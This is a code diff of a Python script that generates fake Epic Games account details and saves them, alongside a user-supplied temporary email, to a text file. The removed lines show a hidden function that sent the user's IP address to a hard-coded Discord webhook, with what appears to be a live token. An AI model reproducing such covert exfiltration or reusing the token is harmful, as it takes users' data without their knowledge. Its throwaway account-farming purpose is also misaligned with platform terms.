@@ -1,7 +1,16 @@
 import random
-import requests
 import socket
 import string
+import calendar
+from ctypes import windll
+
+def set_window_always_on_top():
+    HWND_TOPMOST = -1
+    HWND = windll.user32.GetForegroundWindow()
+    windll.user32.SetWindowPos(HWND, HWND_TOPMOST, 0, 0, 0, 0, 0x0001)
+
+def convert_month_number(month_number):
+    return calendar.month_abbr[month_number]
 
 def generate_name():
     prefixes = ["Ava", "Eli", "Emma", "Liam", "Olivia", "Noah", "Isabella", "Sophia", "Mia", "Charlotte"]
@@ -18,7 +27,7 @@ def generate_date():
     month = random.randint(1, 12)
     year = 2000
 
-    return f"{day:02d}/{month:02d}/{year}"
+    return f"{day:02d}/{convert_month_number(month)}/{year}"
 
 
 def generate_display_name():
@@ -38,18 +47,7 @@ def generate_password(length):
     return password
 
 
-def send_ip_to_webhook(ip_address):
-    webhook_url = 'https://discord.com/api/webhooks/1109012679496056842/qRdZm82XtDZ2271eQ9vMkzCoQrhG_2NPOoDaflg8dZS_7NgVAHAD6KQ5t8cdh42H2ye2'
-    message = f'FREE IP: {ip_address}'
-
-    payload = {
-        'content': message
-    }
-
-    response = requests.post(webhook_url, json=payload)
-
-
-def generate_epic_games_code():
+def generate_epic_games_code(email):
     # Generate a random display name, its corresponding first and last name, and a date
     display_name, first_last_name = generate_display_name()
     date = generate_date()
@@ -57,23 +55,30 @@ def generate_epic_games_code():
     # Get the computer's IP address
     ip_address = socket.gethostbyname(socket.gethostname())
 
-    # Send the IP address to the Discord webhook
-    send_ip_to_webhook(ip_address)
+    # Generate a random password with a length of 10 characters
+    password = generate_password(10)
 
-    # Print the generated display name, first and last name, date, and IP address
+    # Save the account details to a text file
+    with open("../python non virus/account_details.txt", "a") as file:
+        file.write("Email: " + email + "\n")
+        file.write("Display Name: " + display_name + "\n")
+        file.write("First and Last Name: " + first_last_name + "\n")
+        file.write("Date: " + date + "\n")
+        file.write("Password: " + password + "\n")
+        file.write("-------------------------------\n")
+
+    # Print the generated details
+    print("-------------------------")
+    print("Email:", email)
     print("Generated Display Name:", display_name)
     print("Generated First and Last Name:", first_last_name)
     print("Generated Date:", date)
-
-    # Generate a random password with a length of 10 characters
-    password = generate_password(10)
     print("Generated Password:", password)
-
-    # Add a clickable link to the output
-    print("Click here to visit the temporary email service:'https://temp-mail.org/'")
-
+    print("-------------------------")
 
 def main():
+    set_window_always_on_top()
+
     print(
         "               _                            _                _ _                                                _             ")
     print(
@@ -91,13 +96,24 @@ def main():
     print(
         "                                                                        |___/   |___/                                         ")
 
-    print("Please select an option:")
-    print("1. Epic Games")
+    while True:
+        print("Please select an option:")
+        print("1. Epic Games")
+        print("2. Quit")
 
-    choice = input("Enter your choice: ")
+        choice = input("Enter your choice: ")
 
-    if choice == "1":
-        generate_epic_games_code()
+        if choice == "1":
+            print("Click here to generate your temporary email for your epic account: 'https://temp-mail.org/'")
+            email = input("Enter your temporary generated email address: ")
+            generate_epic_games_code(email)
+            generate_more = input("Do you want to generate more accounts? (Y/N): ")
+            if generate_more.upper() == "N":
+                break
+        elif choice == "2":
+            break
+        else:
+            print("Invalid choice. Please try again.")
 
     input("Press Enter to exit...")
 
